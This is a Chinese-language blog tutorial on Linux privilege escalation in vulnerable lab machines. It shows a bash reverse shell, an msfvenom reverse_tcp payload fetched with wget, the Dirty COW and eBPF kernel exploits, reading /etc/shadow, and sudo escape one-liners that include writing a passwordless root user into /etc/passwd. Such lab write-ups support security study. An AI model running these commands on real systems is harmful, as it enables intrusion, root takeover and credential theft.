<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Linux提权 | Maxenton</title><meta name="author" content="Maxenton"><meta name="copyright" content="Maxenton"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这是Linux提权的学习日记。">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux提权">
<meta property="og:url" content="https://maxenton-pym.top/2022/05/01/linux_sudo/index.html">
<meta property="og:site_name" content="Maxenton">
<meta property="og:description" content="这是Linux提权的学习日记。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://maxenton-pym.top/img/getshell.png">
<meta property="article:published_time" content="2022-04-30T16:00:00.000Z">
<meta property="article:modified_time" content="2022-12-03T06:31:56.266Z">
<meta property="article:author" content="Maxenton">
<meta property="article:tag" content="信息安全">
<meta property="article:tag" content="安全知识">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://maxenton-pym.top/img/getshell.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://maxenton-pym.top/2022/05/01/linux_sudo/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?2ec9fa90a95a4d6f2c1057f31b412d4a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Maxenton","link":"链接: ","source":"来源: Maxenton","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Linux提权',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-12-03 14:31:56'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom/custom.css"><script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">76</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">39</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-folder-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/getshell.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Maxenton</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-folder-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Linux提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-30T16:00:00.000Z" title="发表于 2022-05-01 00:00:00">2022-05-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-03T06:31:56.266Z" title="更新于 2022-12-03 14:31:56">2022-12-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/">安全知识</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Linux提权"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022/05/01/linux_sudo/#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><img src="https://img-blog.csdnimg.cn/d5b7ea3385fc488bb4ad9a896762eeda.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;本篇文章仅用于学习记录，不得用于其他违规用途。&#x3D;&#x3D;</p>
<h1 id="一、内核漏洞提权"><a href="#一、内核漏洞提权" class="headerlink" title="一、内核漏洞提权"></a>一、内核漏洞提权</h1><h2 id="1、常规查找"><a href="#1、常规查找" class="headerlink" title="1、常规查找"></a>1、常规查找</h2><p>查看内核版本信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname <span class="literal">-a</span></span><br><span class="line">uname <span class="literal">-r</span></span><br></pre></td></tr></table></figure>
<p>查看系统发行版本</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/issue</span><br><span class="line"><span class="built_in">cat</span> /etc/*<span class="literal">-release</span></span><br><span class="line"></span><br><span class="line">Ubuntu <span class="number">16.04</span></span><br><span class="line"><span class="number">4.4</span>.<span class="number">0</span><span class="literal">-21-generic</span></span><br></pre></td></tr></table></figure>
<p>搜索该版本漏洞，把对应版本的文件上传到服务器编译执行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu16.<span class="number">04</span></span><br><span class="line">searchsploit <span class="literal">-u</span> <span class="comment">#更新数据库</span></span><br></pre></td></tr></table></figure>

<h2 id="2、Ubuntu-16-04提权"><a href="#2、Ubuntu-16-04提权" class="headerlink" title="2、Ubuntu 16.04提权"></a>2、Ubuntu 16.04提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DC<span class="literal">-3</span> 靶机做实验 , 开局一个shell</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">0.189</span>/templates/beez3/error.php</span><br><span class="line">/bin/bash <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">101.48</span>/<span class="number">5656</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> </span><br><span class="line">DC<span class="literal">-3</span>下载地址</span><br><span class="line">https://www.vulnhub.com/entry/dc<span class="literal">-32</span>,<span class="number">312</span>/</span><br><span class="line">后台</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">101.123</span>/administrator/</span><br><span class="line">admin snoopy</span><br></pre></td></tr></table></figure>
<p>发现是ubuntu16.04内核版本是4.4.0-21的，直接通过kali里面的漏洞库，搜索一下是否有exp</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu <span class="number">16.04</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/b986212469bd49b587c54fd69322232b.png" alt="在这里插入图片描述"><br>这里我们使用33772.txt这个文件里的exp提权</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看文件内容</span><br><span class="line"><span class="built_in">cat</span> /usr/share/exploitdb/exploits/linux/local/<span class="number">39772</span>.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/4deadf90c791468192e0ded216649b47.png" alt="在这里插入图片描述"><br>下载好后 , 通过python开启http服务 , 把压缩包下载到靶机上</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="literal">-m</span> http.servev <span class="number">8080</span> <span class="literal">--bind</span> <span class="number">192.168</span>.<span class="number">42.142</span> </span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">0.36</span>:<span class="number">8000</span>/<span class="number">39772</span>.zip</span><br></pre></td></tr></table></figure>
<p>接下来就是解压提权了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">unzip <span class="number">39772</span>.zip <span class="built_in">cd</span> <span class="number">39772</span></span><br><span class="line">tar <span class="literal">-xvf</span> exploit.tar <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit <span class="built_in">ls</span></span><br><span class="line">./compile.sh</span><br><span class="line">./doubleput</span><br><span class="line">whoami</span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/6cf87a5d5c5940fbb97217f8b35bee42.png" alt="在这里插入图片描述"></p>
<h2 id="3、脏牛提权"><a href="#3、脏牛提权" class="headerlink" title="3、脏牛提权"></a>3、脏牛提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf靶机演示</span><br><span class="line">CVE<span class="literal">-2016-5195</span> </span><br><span class="line">Linux kernel &lt; <span class="number">4.8</span>.<span class="number">3</span> ( 使用msf靶机演示 )</span><br></pre></td></tr></table></figure>
<p>前提环境</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf上线</span><br><span class="line">msfvenom <span class="literal">-p</span> linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">0.96</span> LPORT=<span class="number">8001</span> <span class="operator">-f</span> elf <span class="literal">-o</span> /tmp/shell.elf</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">python3 <span class="literal">-m</span> http.server</span><br><span class="line">msf监听</span><br><span class="line">msfconsole <span class="literal">-r</span> handler.rc</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp run <span class="literal">-j</span></span><br><span class="line">靶机上操作</span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">6.73</span>:<span class="number">8000</span>/shell.elf chmod +x shell.elf</span><br><span class="line">nohup ./shell.elf &amp;</span><br><span class="line">msf上线</span><br><span class="line">getuid <span class="comment"># 查看权限 shell</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br></pre></td></tr></table></figure>
<p><strong>exp下载地址:<a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a> , 将下载好的exp放到msf这台机器上</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过python切换成交互式shell</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> <span class="built_in">cat</span> /etc/shadow</span><br><span class="line">uname <span class="literal">-a</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">0.36</span>:<span class="number">8000</span>/dirtycow<span class="literal">-master</span>.zip unzip dirtycow<span class="literal">-master</span>.zip</span><br><span class="line"><span class="built_in">cd</span> dirtycow<span class="literal">-master</span></span><br><span class="line">gcc <span class="literal">-pthread</span> dirty.c <span class="literal">-o</span> dirty <span class="literal">-lcrypt</span></span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/0de0255cfb164c0bab69aa5efa0588da.png" alt="在这里插入图片描述"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su firefart <span class="number">123456</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/49434d5461fc44eb94d7a9702d3af1ef.png" alt="在这里插入图片描述"><br>实际上做的是备份+修改&#x2F;etc&#x2F;passwd文件 , 如果你想恢复的话执行以下命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></table></figure>
<h1 id="二、滥用sudo提权"><a href="#二、滥用sudo提权" class="headerlink" title="二、滥用sudo提权"></a>二、滥用sudo提权</h1><h2 id="1、什么是sudo"><a href="#1、什么是sudo" class="headerlink" title="1、什么是sudo"></a>1、什么是sudo</h2><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等，这样不仅减少了root用户的登录和管理时间，同样也提高了安全性，sudo不是对shell的一个代替，它是面向每个命令的基础。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">它的特性主要有这样几点: sudo能够限制用户只在某台主机上运行某些命令。</span><br><span class="line">sudo提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到中心主机或者日志服务 器。</span><br><span class="line">sudo使用时间戳文件来执行类似的“检票”系统。当用户调用sudo并且输入它的密码时，用户获得了 一张存活期为<span class="number">5</span>分钟的票(这个值可以在编译的时候改变)。</span><br><span class="line">sudo的配置文件是sudoers文件，它允许系统管理员集中的管理用户的使用权限和使用的主机。它所存 放的位置默认是在/etc/sudoers，属性必须为<span class="number">0440</span>。</span><br><span class="line">在sudo于<span class="number">1980</span>年前后被写出之前，一般用户管理系统的方式是利用su切换为超级用户。但是使用su的 缺点之一在于必须要先告知超级用户的密码。</span><br><span class="line">sudo使一般用户不需要知道超级用户的密码即可获得权限。首先超级用户将普通用户的名字、可以执 行的特定命令、按照哪种用户或用户组的身份执行等信息，登记在特殊的文件中(通常 是/etc/sudoers)，即完成对该用户的授权(此时该用户称为“sudoer ”);在一般用户需要取得特 殊权限时，其可在命令前加上“sudo”，此时sudo将会询问该用户自己的密码(以确认终端机前的是 该用户本人)，回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内(默认为<span class="number">5</span> 分钟，可在/etc/sudoers自定义)，使用sudo不需要再次输入密码。</span><br><span class="line">由于不需要超级用户的密码，部分Unix系统甚至利用sudo使一般用户取代超级用户作为管理帐号，例 如Ubuntu、Mac OS X等。</span><br></pre></td></tr></table></figure>
<p><strong>参数说明</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-V</span> 显示版本编号</span><br><span class="line"><span class="literal">-h</span> 会显示版本编号及指令的使用方式说明</span><br><span class="line"><span class="literal">-l</span> 显示出自己(执行 sudo 的使用者)的权限</span><br><span class="line"><span class="literal">-v</span> 因为 sudo 在第一次执行时或是在 N 分钟内没有执行(N 预设为五)会问密码，这个参数是重新做 一次确认，如果超过 N 分钟，也会问密码</span><br><span class="line"><span class="literal">-k</span> 将会强迫使用者在下一次执行 sudo 时问密码(不论有没有超过 N 分钟)</span><br><span class="line"><span class="literal">-b</span> 将要执行的指令放在背景执行</span><br><span class="line"><span class="literal">-p</span> prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %<span class="built_in">h</span> 会显示主机名称</span><br><span class="line"><span class="literal">-u</span> username/<span class="comment">#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令(#uid 为该 username 的使用者号码)</span></span><br><span class="line"><span class="literal">-s</span> 执行环境变数中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell</span><br><span class="line"><span class="literal">-H</span> 将环境变数中的 HOME (家目录)指定为要变更身份的使用者家目录(如不加 <span class="literal">-u</span> 参数就是系统管 理者 root )</span><br><span class="line">command 要以系统管理者身份(或以 <span class="literal">-u</span> 更改为其他人)执行的指令</span><br></pre></td></tr></table></figure>

<h2 id="2、sudoer文件语法"><a href="#2、sudoer文件语法" class="headerlink" title="2、sudoer文件语法"></a>2、sudoer文件语法</h2><p>sudoers文件主要有三部分组成</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudoers的默认配置(default)，主要设置sudo的一些缺省值 alias(别名)，主要有Host_Alias|Runas_Alias|User_Alias|Cmnd_Alias。 安全策略(规则定义)——重点。</span><br><span class="line">语法</span><br><span class="line">root ALL=(ALL) ALL</span><br><span class="line">说明<span class="number">1</span>:root用户可以从 ALL终端作为 ALL(任意)用户执行，并运行 ALL(任意)命令。 第一部分是用户，第二部分是用户可以在其中使用sudo命令的终端，第三部分是他可以充当的用户， 最后一部分是他在使用时可以运行的命令。sudo</span><br><span class="line">touhid ALL= /sbin/poweroff 说明<span class="number">2</span>:以上命令，使用户可以从任何终端使用touhid的用户密码关闭命令电源。</span><br><span class="line">touhid ALL = (root) NOPASSWD:/usr/bin/find 说明<span class="number">3</span>:上面的命令，使用户可以从任何终端运行，以root用户身份运行命令find 而无需密码。</span><br></pre></td></tr></table></figure>
<p><strong>设置某个用户执行某个命令sudo免密码</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sudoers</span><br><span class="line">在最后一行添加</span><br><span class="line">当前用户名 ALL = (root) NOPASSWD:/usr/bin/find , 如 derian ALL = (root) NOPASSWD:/usr/bin/find</span><br><span class="line">所有sudo命令不需要密码</span><br><span class="line">vi /etc/sudoers</span><br><span class="line">用户名 ALL=(ALL:ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>

<h2 id="3、利用sudo提权"><a href="#3、利用sudo提权" class="headerlink" title="3、利用sudo提权"></a>3、利用sudo提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sudoers</span><br><span class="line">在最后一行添加</span><br><span class="line">当前用户名 ALL = (root) NOPASSWD:/usr/bin/find</span><br><span class="line">所有sudo命令不需要密码</span><br><span class="line">vi /etc/sudoers</span><br><span class="line">用户名 ALL=(ALL:ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure>
<p><strong>sudo -l #显示允许当前用户使用的命令</strong><br><img src="https://img-blog.csdnimg.cn/d86f6fa79a0b41f388e58499bb5d79e1.png" alt="在这里插入图片描述"></p>
<h2 id="4、find命令"><a href="#4、find命令" class="headerlink" title="4、find命令"></a>4、find命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo find /etc/passwd <span class="literal">-exec</span> /bin/sh \; <span class="comment"># 查看当前用户</span></span><br><span class="line">sudo find /etc/passwd <span class="literal">-exec</span> whoami \; <span class="comment"># 查看shadow</span></span><br><span class="line">sudo find /etc/passwd <span class="literal">-exec</span> <span class="built_in">cat</span> /etc/shadow \;</span><br></pre></td></tr></table></figure>

<h2 id="5、vim命令"><a href="#5、vim命令" class="headerlink" title="5、vim命令"></a>5、vim命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim <span class="literal">-c</span> <span class="string">&#x27;!sh&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="6、nmap命令"><a href="#6、nmap命令" class="headerlink" title="6、nmap命令"></a>6、nmap命令</h2><p>适用版本:nmap2.02至5.21 在早期nmap版本中,带有交互模式,因而允许用户执行shell命令 使用如下命令进入nmap交互模式</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="literal">--interactive</span></span><br></pre></td></tr></table></figure>
<p>在nmap交互模式中 通过如下命令提权</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh </span><br><span class="line">sh<span class="literal">-3</span>.<span class="number">2</span><span class="comment"># whoami </span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>没有交互的最新方式</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; /tmp/shell.nse &amp;&amp; sudo nmap —script = /tmp/shell.nse</span><br></pre></td></tr></table></figure>

<h2 id="7、git命令"><a href="#7、git命令" class="headerlink" title="7、git命令"></a>7、git命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git <span class="literal">-p</span> help 或者 sudo git help config !/bin/sh</span><br><span class="line"><span class="comment"># whoami root</span></span><br></pre></td></tr></table></figure>

<h2 id="8、teehee命令"><a href="#8、teehee命令" class="headerlink" title="8、teehee命令"></a>8、teehee命令</h2><p>teehee命令可以往一个文件追加内容，可以通过它向&#x2F;etc&#x2F;passwd写入内容，新增一个超级用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;test::0:0:::/bin/bash&quot;</span> | sudo teehee <span class="literal">-a</span> /etc/passwd</span><br><span class="line">su test</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>

<h2 id="9、man命令"><a href="#9、man命令" class="headerlink" title="9、man命令"></a>9、man命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">man</span> <span class="built_in">man</span> </span><br><span class="line">之后按!</span><br><span class="line"> 按下并按Enter</span><br></pre></td></tr></table></figure>

<h2 id="10、less-x2F-more命令"><a href="#10、less-x2F-more命令" class="headerlink" title="10、less&#x2F;more命令"></a>10、less&#x2F;more命令</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo less /etc/hosts</span><br><span class="line"> sudo more /etc/hosts</span><br><span class="line">之后按! </span><br><span class="line">按下并按Enter</span><br></pre></td></tr></table></figure>

